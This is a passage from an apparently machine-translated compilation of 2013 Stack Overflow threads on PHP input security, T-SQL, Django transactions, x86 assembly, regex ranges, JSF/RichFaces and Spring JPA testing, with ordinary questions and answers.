此规则的扩展，**对初学者很重要**：准确使用适合当前环境的度量。不要只在您知道的用户输入中投入一切，并希望它会更安全，这会**适得其反**！我经常看到这样的问题：“如果我`addslashes(mysql_real_escape_string(strip_tags(htmlspecialchars())))`在所有 $_POST 变量上使用，我的应用程序是否安全？” - 如果您甚至认为这是一种有效的方法，那么您对有关用户输入的安全性如何工作有一个严重的误解。我再说一遍：**什么是安全的，什么不是，总是取决于上下文！**

一个很好的学习资源是**[开放 Web 应用程序安全项目](https://www.owasp.org/)**

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-12T12:34:16.590

这永远不够。但希望你会不断进步。也许当你准备好时，你就会了解自己。

了解最常见的安全问题，例如：

*   Sql 注入
*   表单欺骗
*   跨站脚本

并记住：

*   始终验证用户输入（包括会话）
*   阻止访问不应公开的文件夹
*   使用河豚而不是 md5/sha1 作为密码
*   向最终用户隐藏错误（并记录它们）

另请查看[本指南](http://phpsec.org/projects/guide/)，该指南总结了最著名的安全问题。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-12T12:33:17.080

看看 SQL 注入和 XSS。这一切都在验证用户输入。永远不要相信用户。

[SQL 注入](http://en.wikipedia.org/wiki/SQL_injection)

[跨站脚本](http://en.wikipedia.org/wiki/Cross-site_scripting)

最后最好的学习方法是因为安全性差而遭受攻击。然后你就会明白它是如何工作的。只有一个提示，进行备份。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-12T12:35:12.380

您网站中最关键的一点是用户可以向您的数据库提供文本。在 stackoverflow 上阅读此问题，以获得有关如何防止 sql 注入的良好答案。 [如何防止php中的sql注入](https://stackoverflow.com/questions/60174/how-to-prevent-sql-injection-in-php)

# tsql - 自动填充 T-SQL 表

> ID：14832573
> 
> 赞同：0
> 
> 时间：2013-02-12T12:28:09.080
> 
> 标签：tsql, auto-populating

我需要在表格中输入一个包含 7 种间距的 126 个站点的列表。我写的脚本不正确，我不知道为什么。

我想看到的是1、1、1、1、1、1、1`Site_Skey`的列和`PitchType_Skey`1、2、3、4、5、6、7 的列，然后是`Site_Skey`2、2、2、2、2 ,2,2 和一列`PitchType_Skey`1,2,3,4,5,6,7 这需要重复 126 次。

你能帮我吗？

当前脚本：

```
 DECLARE @PitchType_Skey INT
    DECLARE @Site_Skey INT

    SET @PitchType_Skey = 1
    SET @Site_Skey = 1

    WHILE (@PitchType_Skey <= 882)
    WHILE (@Site_Skey <= 882)

   BEGIN
   INSERT INTO Capacity (PitchType_Skey, Site_Skey)
   SELECT (CASE WHEN @PitchType_Skey % 7 = 0 THEN 7 ELSE @PitchType_Skey % 7 END),
   (CASE WHEN @Site_Skey % 126 = 0 THEN 126 ELSE @Site_Skey % 126 END)
   SET @PitchType_Skey = @PitchType_Skey + 1
   SET @Site_Skey = @Site_Skey + 1
   END 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-12T12:45:40.547

很简单的方法....

```
DECLARE @PitchType_Skey INT
DECLARE @Site_Skey INT

SET @PitchType_Skey = 1
SET @Site_Skey = 1

WHILE (@Site_Skey < 127)
BEGIN
  IF @PitchType_Skey = 8
  BEGIN
   SET @PitchType_Skey = 1
   SET @Site_Skey = @Site_Skey + 1
  END

  IF (@Site_Skey < 127)
  BEGIN
     INSERT INTO dbo.Capacity (PitchType_Skey, Site_Skey)
     SELECT @PitchType_Skey, @Site_Skey
  END

  SET @PitchType_Skey = @PitchType_Skey + 1

END 
```

# cakephp - Working with Cakephp and TinyMCE Editor

> ID：14832575
> 
> 赞同：-4
> 
> 时间：2013-02-12T12:28:12.527
> 
> 标签：cakephp, tinymce

**I am using cakephp 2.3 version. I tried to get tinymce editor by reference of Helper TinyMCE for CakePHP 2 [http://bakery.cakephp.org/articles/galitul/2012/04/11/helper_tinymce_for_cakephp_2].**

At the end

> Error: The application is trying to load a file from the jquery-1 plugin

is showing. I cound solve this error. Please help me to solve this error.

Thanks in advance.

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-12T12:37:27.233

You really shouldn't need a plugin for this as TinyMCE is a plugin. Just include TinyMCE in your template and in your JavaScript attach it to textareas that require the editor. I do this using the jQuery version of TinyMCE and attach it to any textarea with the class "wysiwyg" (which I add to the relevant form elements.

# jboss - 如何向mbean动态添加和注册新属性

> ID：14832576
> 
> 赞同：0
> 
> 时间：2013-02-12T12:28:13.187
> 
> 标签：jboss, jmx, mbeans

是否可以向 mbean 动态添加和注册新属性

例如：

```
<server>

<mbean code="org.jboss.example.MyMbean" name="jboss:service=myMbean,name=MyMbeanExample">

<attribute name="attribute1">value1</attribute>

<attribute name="attribute2">value2</attribute>

<attribute name="attribute3">value3</attribute>

<attribute name="attribute4">value5</attribute>

<attribute name="attribute5">value5</attribute>...

</mbean>
</server> 
```

在 jboss-service.xml 中添加的新属性应该在 MyMbean 中动态注册，并在 Mbean 中进行任何代码更改，可以这样做吗？

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-12T14:43:19.670

如果没有看到 DynamicMBean 的代码，很难回答您的问题，但我怀疑您的问题的答案是否定的，前提是 MBean 中没有代码更改。但是，这是一种总体方法（对您的代码进行一些自由假设）：

*   像这样的[DynamicMBean](http://docs.oracle.com/javase/1.5.0/docs/api/javax/management/DynamicMBean.html)通常会有某种映射，以属性名称为键，并包含属性的值（简单），或包含以下部分或全部内容的值对象，旨在获取/设置属性：
    *   一个目标调用对象，
    *   一种[方法](http://docs.oracle.com/javase/1.5.0/docs/api/java/lang/reflect/Method.html)
    *   方法的参数数组
*   当请求 MBean的[MBeanInfo时，提供的](http://docs.oracle.com/javase/1.5.0/docs/api/javax/management/MBeanInfo.html)[MBeanAttributeInfo](http://docs.oracle.com/javase/1.5.0/docs/api/javax/management/MBeanAttributeInfo.html)应该引用此映射中的键（以及数据类型、可变性等）。您可以在每次请求 MBeanInfo 时动态生成这些，或者保持更新每当您添加新属性时都会更新 MBeanAttributeInfo 的集合。
*   如果集合引用了一个不存在的属性，则[setAttribute](http://docs.oracle.com/javase/1.5.0/docs/api/javax/management/DynamicMBean.html#setAttribute%28javax.management.Attribute%29)和[setAttributes](http://docs.oracle.com/javase/1.5.0/docs/api/javax/management/DynamicMBean.html#setAttributes%28javax.management.AttributeList%29)方法应该创建一个新属性（通过将新的键和值插入到属性映射中）。

由于您使用的是 JBoss，如果您觉得您可能想要实现类似的东西，请考虑扩展 JBoss 的[ServiceDynamicMBeanSupport](http://docs.jboss.org/jbossas/javadoc/3.2.7/system/org/jboss/system/ServiceDynamicMBeanSupport.html)。它为您做了一些但不是全部的跑腿工作。

# django - 在 Django 中使用嵌套的 @transaction.commit_on_success

> ID：14832579
> 
> 赞同：6
> 
> 时间：2013-02-12T12:28:27.630
> 
> 标签：django, transactions

考虑这个简单的例子：

```
# a bank account class
class Account:
    @transaction.commit_on_success
    def withdraw(self, amount):
        # code to withdraw money from the account 

    @transaction.commit_on_success
    def add(self, amount):
        # code to add money to the account

# somewhere else
@transaction.commit_on_success
def makeMoneyTransaction(src_account, dst_account, amount):
    src_account.withdraw(amount)
    dst_account.add(amount) 
```

（取自[https://code.djangoproject.com/ticket/2227](https://code.djangoproject.com/ticket/2227)）

如果在 中引发异常，则仍将提交in`Account.add()`的事务并且会丢失金钱，因为 Django 当前不处理嵌套事务。`Account.withdraw()`

如果不对 Django 应用补丁，我们如何确保提交被发送到数据库，但前提是`@transaction.commit_on_success`装饰器下的 main 函数完成而不会引发异常？

我遇到了这个片段：[http](http://djangosnippets.org/snippets/1343/) ://djangosnippets.org/snippets/1343/ ，它似乎可以完成这项工作。如果我使用它，我应该注意什么缺点？

如果您能提供帮助，请提前非常感谢。

PS为了可见性，我正在复制之前引用的代码片段：

```
def nested_commit_on_success(func):
    """Like commit_on_success, but doesn't commit existing transactions.

    This decorator is used to run a function within the scope of a 
    database transaction, committing the transaction on success and
    rolling it back if an exception occurs.

    Unlike the standard transaction.commit_on_success decorator, this
    version first checks whether a transaction is already active.  If so
    then it doesn't perform any commits or rollbacks, leaving that up to
    whoever is managing the active transaction.
    """
    commit_on_success = transaction.commit_on_success(func)
    def _nested_commit_on_success(*args, **kwds):
        if transaction.is_managed():
            return func(*args,**kwds)
        else:
            return commit_on_success(*args,**kwds)
    return transaction.wraps(func)(_nested_commit_on_success) 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-12T21:18:46.567

这个片段的问题是它不能让你在不回滚外部事务的情况下回滚内部事务。例如：

```
@nested_commit_on_success
def inner():
    # [do stuff in the DB]

@nested_commit_on_success
def outer():
    # [do stuff in the DB]
    try:
        inner()
    except:
        # this did not work, but we want to handle the error and
        # do something else instead:

        # [do stuff in the DB]

outer() 
```

在上面的示例中，即使`inner()`引发异常，其内容也不会回滚。

您需要的是内部“事务”的[保存点。](https://docs.djangoproject.com/en/dev/topics/db/transactions/#savepoints)对于您的代码，它可能如下所示：

```
# a bank account class
class Account:
    def withdraw(self, amount):
        sid = transaction.savepoint()
        try:
            # code to withdraw money from the account
        except:
            transaction.savepoint_rollback(sid)
            raise

    def add(self, amount):
        sid = transaction.savepoint()
        try:
            # code to add money to the account
        except:
            transaction.savepoint_rollback(sid)
            raise

# somewhere else
@transaction.commit_on_success
def makeMoneyTransaction(src_account, dst_account, amount):
    src_account.withdraw(amount)
    dst_account.add(amount) 
```

从 Django 1.6 开始，[atomic()](https://docs.djangoproject.com/en/1.6/topics/db/transactions/#django.db.transaction.atomic)装饰器就是这样做的：它使用事务来外部使用装饰器，而任何内部使用都使用保存点。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-09-04T18:15:28.503

Django 1.6 引入了[@atomic](https://docs.djangoproject.com/en/1.6/topics/db/transactions/#controlling-transactions-explicitly)，这正是我想要的！

它不仅支持“嵌套”事务，而且还替换了旧的、功能较弱的装饰器。跨不同 Django 应用程序的事务管理具有独特且一致的行为是很好的。

# c - 如何在 x86 中返回寄存器值

> ID：14832580
> 
> 赞同：0
> 
> 时间：2013-02-12T12:28:29.647
> 
> 标签：c, assembly, x86

编写将一个寄存器值返回给 C 中的调用函数的 x86 汇编函数的正确语法是什么？是否涉及一些堆栈操作，如果是这样，之后如何清理？我会感谢一个简单的例子。先感谢您。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-12T12:49:17.043

通常，以下页眉和页脚用于 32 位程序：

```
MyProc:
; prologue
    push  ebp
    mov   ebp, esp

    sub   esp, sizeof_local_variables   ; this is optional, if your procedure
                                        ; needs some local variables.

; here write your code. 
; The arguments are accessible on addresses [ebp+8+some_const]
; The local variables are on addresses [ebp-some_const] 
; where some_const must be less than sizeof_local_variables of course.

; Return the result in EAX register if you want to return it to C/C++ or other HLL.

; epilogue
    mov   esp, ebp       ; restores the stack pointer as it was on the entry
    retn  n              ; returns to the caller. If you are using CCALL convention
                         ; (usualy in C code) you have to omit "n" constant.
                         ; n is the count of bytes of the pushed arguments.
                         ; in 32bit environment it must be multiply of 4 
```

序列“push ebp/mov ebp, esp”可以由指令“enter”和“mov esp, ebp”由“leave”提供，但我更喜欢让它更易于理解，并且在大多数平台上使用显式指令更快。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-12T12:59:21.577

有了gcc，就可以使用内联汇编了，不用太担心堆栈。

```
unsigned int get_eax(void) {
    unsigned int eax;
    asm("" : "=a" (eax));
    return eax;
} 
```

这使用了一个没有指令的汇编部分，输出约束表明 eax 的值应该放在一个名为 的变量中`eax`。

我`unsigned int`用于寄存器，它不是很便携，但内联汇编无论如何也不是很便携。该变量需要是寄存器的大小。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-12T12:46:33.790

在 Linux 中，如果返回 int，则返回 eax，long（仅限 64 位模式）返回 rax。

# regex - R中函数之间的简单解析？

> ID：14832581
> 
> 赞同：0
> 
> 时间：2013-02-12T12:28:32.880
> 
> 标签：regex, r, html-parsing

假设我想提取在两个已定义字符串之间找到的字符串。例如，我们将调用它的函数`parse_between()`在 R 中的工作方式如下：

```
>main_string<-"the quick brown fox>$ jumps over the lazy </ dog"
>substring<-parse_between(main_string, begin=">$", end="</")
>substring
[1] " jumps over the lazy " 
```

如果它可以生成一个包含与每个实例对应的元素的向量，那就更好了。我搜索了一些可用于字符串操作的包，如“stringr”，但没有找到像示例所示那样轻松执行此操作的函数。不幸的是，尽管搜索了我还没有找到 R 的 html 解析器，但我的动机是解析 html 文件。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-12T12:37:02.267

首先，请仔细阅读这个问题和答案： [RegEx match open tags except XHTML self-contained tags](https://stackoverflow.com/questions/1732348/regex-match-open-tags-except-xhtml-self-contained-tags/1732454#1732454)

然后，如果仍然没有被阻止，请使用`regex`or `gsub`，这两者都有元字符来指定行的开头或结尾。那你能做的就是更换

```
{start_of_line through to ">$"} 
```

什么都没有，然后替换

```
{"</" through to end_of_line} 
```

一无所有。

# java - A4j:commndButton and a4j:commandLink are not appear in output

> ID：14832585
> 
> 赞同：0
> 
> 时间：2013-02-12T12:28:38.087
> 
> 标签：java, jsf, richfaces, ajax4jsf

I'm new in jsf and richfces. I want to write a simple web application using richfces 4, on Tomcat 7 in intellij idea. The problem is that commandbutton and link button re not shown in result page. This is my app code:

```
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://java.sun.com/xml/ns/javaee"
           xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
           xsi:schemaLocation="http://java.sun.com/xml/ns/javaee
          http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd"
           version="2.5">

    <servlet>
        <servlet-name>Faces Servlet</servlet-name>
        <servlet-class>javax.faces.webapp.FacesServlet</servlet-class>
        <load-on-startup>1</load-on-startup>
    </servlet>
    <servlet-mapping>
        <servlet-name>Faces Servlet</servlet-name>
        <url-pattern>/faces/*</url-pattern>
    </servlet-mapping>
    <servlet-mapping>
        <servlet-name>Faces Servlet</servlet-name>
        <url-pattern>*.xhtml</url-pattern>
    </servlet-mapping>

    <context-param>
        <param-name>org.richfaces.skin</param-name>
        <param-value>blueSky</param-value>
    </context-param>

</web-app> 
```

and this is the view code: (index_sample2.xhtml)

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"
                xmlns:h="http://java.sun.com/jsf/html"
                xmlns:f="http://java.sun.com/jsf/core"
                xmlns:ui="http://java.sun.com/jsf/facelets"
                xmlns:a4j="http://richfaces.org/a4j"
                xmlns:rich="http://richfaces.org/rich">
<head>
    <style type="text/css">

        .outhello {
            font-weight: bold;
        }

    </style>
</head>
<body>
    <h:form>
        <h:panelGrid columns="3">
            <h:outputText value="Name:" />
            <h:inputText value="#{user.name}" />
            <a4j:commandButton value="Say Hello" render="out" execute="@form" />

        </h:panelGrid>
    </h:form>

    <a4j:outputPanel id="out">
        <h:outputText value="Hello #{user.name} !"
                      rendered="#{not empty user.name}" styleClass="outhello" />
    </a4j:outputPanel>

</body>
</html> 
```

faces-config.xml:

```
<?xml version='1.0' encoding='UTF-8'?>

<faces-config xmlns="http://java.sun.com/xml/ns/javaee"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-facesconfig_2_0.xsd"
              version="2.0">

    <managed-bean>
        <managed-bean-name>user</managed-bean-name>
        <managed-bean-class>demo.User</managed-bean-class>
        <managed-bean-scope>request</managed-bean-scope>
        <managed-property>
            <property-name>name</property-name>
            <property-class>java.lang.String</property-class>
            <value></value>
        </managed-property>
    </managed-bean>
</faces-config> 
```

and User bean:

```
public class User {

    private String name="";

    public String getName() {

        return name;

    }

    public void setName(String name) {

        this.name = name;

    }
} 
```

a4j worked for outputPanel, but it does not work for command link and button. Their display is none!!

In addition I set the skin blueSky in web app. But it seams this is not loaded, too. Would you please help me?

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2013-02-12T13:01:16.803

**渲染属性**是一个
布尔值，指示是否应渲染此组件
并在您的代码中

```
<h:outputText value="Hello #{user.name} !"
                  rendered="#{not empty user.name}" styleClass="outhello" /> 
```

默认值为*true*表示组件将出现
但
您为其分配了一个字符串值
注意：除*true*之外的任何值都被评估为*false*
这意味着当我们编写此代码时

```
rendered="#{not empty user.name}" 
```

这相当于

```
rendered="false" 
```

然后您的组件将不会出现

# regex - 正则表达式数字范围问题，无法停止 -

> ID：14832588
> 
> 赞同：0
> 
> 时间：2013-02-12T12:28:43.483
> 
> 标签：regex

嗨，我正在使用它在开关上生成范围：[http ://code.google.com/p/klish/wiki/subcommands](http://code.google.com/p/klish/wiki/subcommands)

我已将模式设置为 0-255。这工作正常

```
<PTYPE name="MAX_LEARN_ADDR"
            method="integer"
            pattern="0..255"
            /> 
```

这正确地只接受 0-255 并停止像 * $ £ 这样的事情，说它们是无效的。但是 - 导致错误。我试过：

```
 ^([01]?[0-9]?[0-9]|2[0-4][0-9]|25[0-5])$ 
```

同样的事情也会发生。

样本合法输入：

```
switch(config-if)# switchport port-security maximum 3                           
%INFO: port-security maximum is 3, up to 3 DYNAMIC addresses will be learned 
```

样本非法输入：

```
switch(config-if)# switchport port-security maximum *                           
Syntax error: Illegal parameter 
```

然而：

```
switch(config-if)# switchport port-security maximum - 
```

给出一个 python 跟踪，因为 - 没有被捕获为无效参数并且被传递给函数。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-12T12:38:55.547

您为什么不尝试使用它来代替您应该允许的模式？

**编辑 2**好吧，这应该可以解决问题！

```
^(25[0-5]|[2][0-4]\d|[1]\d\d|[1-9]\d|\d)$ 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-12T12:45:56.117

`^([1-9]?\d|1\d{2}|2[0-4]\d|25[0-5])$`将是你需要的

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-12T12:52:21.853

这个正则表达式可能会为您完成工作。

```
^25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d$ 
```

第一部分：`25[0-5]`允许 250 到 255 之间
的数字 第二部分：`2[0-4]\d`允许 200 到 249 之间
的数字 第三部分：`1\d\d`允许 100 到 199之间
的数字 最后一部分：`[1-9]?\d`允许 0 到 99 之间的数字，并确保 00 或 01 可以不被接受，但 0、1 等可以。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-01T15:43:31.007

答案是如果范围从 0 开始，klish 就会出现问题。

# spring - 使用 jparepository 的 junit 测试未在数据库中创建对象

> ID：14832590
> 
> 赞同：0
> 
> 时间：2013-02-12T12:28:42.933
> 
> 标签：spring, junit4, spring-data-jpa, bitronix

我正在使用 Spring 3.2.1.RELEASE、Hibernate 4.1.9.FINAL 作为 jpa 提供程序、spring data 1.2.0.RELEASE 用于存储库和 bitronix 2.1.3 作为事务管理器来启动一个项目。我对所有这些技术都是新手，所以如果我遗漏了一些重要的观点，我很抱歉。

我正在运行一个简单的单元测试来在数据库中创建一个用户对象：

```
@ContextConfiguration(locations={"classpath:tests-context.xml"})
@Transactional
@TransactionConfiguration(transactionManager="transactionManager", defaultRollback=false)
@RunWith(SpringJUnit4ClassRunner.class)
public class UserTest extends AbstractTransactionalJUnit4SpringContextTests
{
@Autowired
protected UserMgmtService userService;

@Test
public void createUserTest()
{
    User user = new User();
    user.setFirstName("jonny");
    user.setLastName("doe");
    user.setUsername("user5");
    user.setPasswordHash("1238");
    user.setEmail("user5@domain.com");
    System.out.println("Created user" + user);
    User testUser = userService.saveUser(user);
    System.out.println("Saved user" + testUser);
    Assert.assertEquals("The user should be equal to saved user", user, testUser);
}
} 
```

我使用的 test-context.xml 如下：

```
<context:annotation-config/>

<!--  Bitronix Transaction Manager embedded configuration -->
<bean id="btmConfig" factory-method="getConfiguration"
    class="bitronix.tm.TransactionManagerServices">
</bean>

<!-- DataSource definition -->

<bean id="dataSource" class="bitronix.tm.resource.jdbc.PoolingDataSource"
    init-method="init" destroy-method="close">
    <property name="className" value="bitronix.tm.resource.jdbc.lrc.LrcXADataSource" />
    <property name="uniqueName" value="jdbc/MySQL_Test_Repository" />
    <property name="minPoolSize" value="0" />
    <property name="maxPoolSize" value="5" />
    <property name="allowLocalTransactions" value="true" />
    <property name="driverProperties">
        <props>
            <prop key="driverClassName">com.mysql.jdbc.Driver</prop>
            <prop key="url">jdbc:mysql://localhost:3306 MySQL_Test_Repository</prop>
            <prop key="user">root</prop>
            <prop key="password">123654</prop>
        </props>
    </property>
</bean>

 <!-- create BTM transaction manager -->
 <bean id="BitronixTransactionManager" factory-method="getTransactionManager"
    class="bitronix.tm.TransactionManagerServices" depends-on="btmConfig,dataSource"
    destroy-method="shutdown" />

<!-- Transaction manager -->
<bean id="transactionManager" class="org.springframework.transaction.jta.JtaTransactionManager" 
        depends-on="BitronixTransactionManager">
    <property name="transactionManager" ref="BitronixTransactionManager" />
    <property name="userTransaction" ref="BitronixTransactionManager" />
    <property name="allowCustomIsolationLevels" value="true" />
    </bean> 

<!-- AOP configuration for transactions --> 
<aop:config>
    <aop:pointcut id="userServiceMethods"
        expression="execution(* users.service.UserMgmtService.*(..))" />

    <aop:advisor advice-ref="transactionAdvice"
    pointcut-ref="userServiceMethods" />

</aop:config> 

<!-- Transaction configuration -->
<tx:advice id="transactionAdvice" transaction-manager="transactionManager">    
    <tx:attributes>
        <tx:method name="*" rollback-for="Exception" />
    </tx:attributes>
</tx:advice>

<tx:annotation-driven transaction-manager="transactionManager"/>

   <!-- bean declaring the property map for the entity manager factory bean -->
   <bean id="jpaPropertyMap" class="org.springframework.beans.factory.config.MapFactoryBean">
    <property name="sourceMap">
        <map>
            <entry key="hibernate.dialect" value="org.hibernate.dialect.MySQL5Dialect"/>

            <!-- show the sql code executed -->
            <entry key="hibernate.show_sql" value="true"/>

            <!-- format the shown sql code -->
            <entry key="hibernate.format_sql" value="true"/>

            <!-- enables hibernate to create db schemas from classes;
            Possible values: validate | update | create | create-drop 
            with create-drop the schema will be created/dropped for each hibernate sesssion open/close-->
            <entry key="hibernate.hbm2ddl.auto" value="update"/> 

            <!-- sets the hibernate classname for the TransactionManagerLookup;
            hibernate wraps and hides the underlying transaction system and needs a reference
            to the transaction manager used  -->
            <entry key="hibernate.transaction.factory_class" value="org.hibernate.transaction.JTATransactionFactory"/>
            <entry key="hibernate.transaction.manager_lookup_class" 
                    value="org.hibernate.transaction.BTMTransactionManagerLookup"/>
        </map>
    </property>
</bean>

    <!-- bean declaring the entity manager factory -->
<bean id="entityManagerFactory" class="org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean">
    <property name="persistenceUnitName" value="ruleEditor.persistence"/>
    <property name="dataSource" ref="dataSource" />
    <property name="jpaPropertyMap" ref="jpaPropertyMap"/>
    </bean>

    <!-- The location where Spring scans for interfaces implementing the JPARepository
    and creates their implementation -->
    <jpa:repositories base-package="users.repository" />

    <!--  Persistence annotations for post processing -->
    <bean class="org.springframework.orm.jpa.support.PersistenceAnnotationBeanPostProcessor" />

<!-- User service implementation bean -->
  <bean id="userMgmtService" class="users.service.impl.UserMgmtServiceImpl"/> 

</beans> 
```

Repository 实现是一个标准的 JPARepository：

```
public interface UserRepository extends JpaRepository<User, Long>
{
User findByUsername(String username);
} 
```

并且服务实现只调用存储库：

```
@Service("userMgmtService")
public class UserMgmtServiceImpl implements UserMgmtService
{
@Autowired
private UserRepository userRepository;

@Override
public User saveUser(User user)
{
    User savedUser = userRepository.save(user);
    return savedUser;
} 
```

问题是当我执行测试时，它通过了，但没有在数据库中创建用户。我认为这可能是因为回滚行为，所以我在用户测试中设置了 defaultRollback=false。以下是事务框架在设置为 DEBUG 时提供的一些可能相关的信息：

```
Running UserTest
2013-02-12 13:01:12 INFO  XmlBeanDefinitionReader:315 - Loading XML bean definitionsfrom class path resource [tests-context.xml]
2013-02-12 13:01:12 INFO  GenericApplicationContext:510 - Refreshing  org.springframework.context.support.GenericApplicationContext@7d95609: startup date [Tue  Feb 12 13:01:12 CET 2013]; root of context hierarchy
2013-02-12 13:01:12 INFO  GenericApplicationContext:1374 - Bean 'dataSource' of type [class bitronix.tm.resource.jdbc.PoolingDataSource] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying)
2013-02-12 13:01:12 INFO  GenericApplicationContext:1374 - Bean 'jpaPropertyMap' of type [class org.springframework.beans.factory.config.MapFactoryBean] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying)
2013-02-12 13:01:12 INFO  GenericApplicationContext:1374 - Bean 'jpaPropertyMap' of type [class java.util.LinkedHashMap] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying)
2013-02-12 13:01:12 INFO  LocalContainerEntityManagerFactoryBean:264 - Building JPA container EntityManagerFactory for persistence unit 'ruleEditor.persistence'

2013-02-12 13:01:13 INFO  SchemaUpdate:182 - HHH000228: Running hbm2ddl schema update
2013-02-12 13:01:13 INFO  SchemaUpdate:193 - HHH000102: Fetching database metadata
2013-02-12 13:01:13 INFO  SchemaUpdate:205 - HHH000396: Updating schema
2013-02-12 13:01:13 INFO  TableMetadata:65 - HHH000261: Table found: MySQL_Test_Repository.user
2013-02-12 13:01:13 INFO  TableMetadata:66 - HHH000037: Columns: [id, enabled, first_name, username, email, password_hash, last_name]
2013-02-12 13:01:13 INFO  TableMetadata:68 - HHH000108: Foreign keys: []
2013-02-12 13:01:13 INFO  TableMetadata:69 - HHH000126: Indexes: [id, username, primary]
2013-02-12 13:01:13 INFO  SchemaUpdate:240 - HHH000232: Schema update complete
2013-02-12 13:01:13 INFO  BitronixTransactionManager:390 - Bitronix Transaction Manager version 2.1.3
2013-02-12 13:01:13 WARN  Configuration:649 - cannot get this JVM unique ID. Make sure it is configured and you only use ASCII characters. Will use IP address instead (unsafe for production usage!).
2013-02-12 13:01:13 INFO  Recoverer:152 - recovery committed 0 dangling transaction(s) and rolled back 0 aborted transaction(s) on 1 resource(s) [jdbc/MySQL_Test_Repository] 
2013-02-12 13:01:14 INFO  GenericApplicationContext:1374 - Bean 'entityManagerFactory' of type [class org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying)
2013-02-12 13:01:14 INFO  GenericApplicationContext:1374 - Bean 'org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor#0' of type [class org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying)
2013-02-12 13:01:14 INFO  GenericApplicationContext:1374 - Bean 'org.springframework.transaction.annotation.AnnotationTransactionAttributeSource#0' of type [class org.springframework.transaction.annotation.AnnotationTransactionAttributeSource] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying)
2013-02-12 13:01:14 INFO  GenericApplicationContext:1374 - Bean 'org.springframework.transaction.config.internalTransactionAdvisor' of type [class org.springframework.transaction.interceptor.BeanFactoryTransactionAttributeSourceAdvisor] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying)
2013-02-12 13:01:14 INFO  JtaTransactionManager:470 - Using JTA UserTransaction: a BitronixTransactionManager with 0 in-flight transaction(s)
2013-02-12 13:01:14 INFO  JtaTransactionManager:481 - Using JTA TransactionManager: a BitronixTransactionManager with 0 in-flight transaction(s)
2013-02-12 13:01:14 DEBUG NameMatchTransactionAttributeSource:94 - Adding transactional method [*] with attribute [PROPAGATION_REQUIRED,ISOLATION_DEFAULT,-Exception]
2013-02-12 13:01:14 DEBUG AnnotationTransactionAttributeSource:106 - Adding transactional method 'createUserTest' with attribute: PROPAGATION_REQUIRED,ISOLATION_DEFAULT; ''
2013-02-12 13:01:14 DEBUG AnnotationTransactionAttributeSource:106 - Adding transactional method 'createUserTest' with attribute: PROPAGATION_REQUIRED,ISOLATION_DEFAULT; ''
2013-02-12 13:01:14 DEBUG JtaTransactionManager:365 - Creating new transaction with name [createUserTest]: PROPAGATION_REQUIRED,ISOLATION_DEFAULT; ''
2013-02-12 13:01:14 INFO  TransactionalTestExecutionListener:279 - Began transaction (1): transaction manager  [org.springframework.transaction.jta.JtaTransactionManager@2a3998f8]; rollback [false]
Created userusers.model.User@63aa9dc1[userId=0,first name=jonny,last name=doe,email=user5@domain.com,username=user5,password=1238,enabled=false]
2013-02-12 13:01:14 DEBUG JtaTransactionManager:470 - Participating in existing transaction
2013-02-12 13:01:14 DEBUG JtaTransactionManager:470 - Participating in existing transaction
Saved userusers.model.User@6b38579e[userId=0,first name=jonny,last name=doe,email=user5@domain.com,username=user5,password=1238,enabled=false]
2013-02-12 13:01:14 DEBUG JtaTransactionManager:752 - Initiating transaction commit
2013-02-12 13:01:14 WARN  Preparer:69 - executing transaction with 0 enlisted resource
2013-02-12 13:01:14 INFO  TransactionalTestExecutionListener:299 - Committed  transaction after test execution for test context [TestContext@5a93c236 testClass =  UserTest, testInstance = UserTest@1ab395af, testMethod = createUserTest@UserTest, testException = [null], mergedContextConfiguration = [MergedContextConfiguration@42821db testClass = UserTest, locations = '{classpath:tests-context.xml}', classes = '{}', contextInitializerClasses = '[]', activeProfiles = '{}', contextLoader = 'org.springframework.test.context.support.DelegatingSmartContextLoader']]
Tests run: 1, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 3.029 sec
2013-02-12 13:01:14 INFO  GenericApplicationContext:1042 - Closing org.springframework.context.support.GenericApplicationContext@7d95609: startup date [Tue Feb 12 13:01:12 CET 2013]; root of context hierarchy
2013-02-12 13:01:14 INFO  BitronixTransactionManager:320 - shutting down Bitronix Transaction Manager
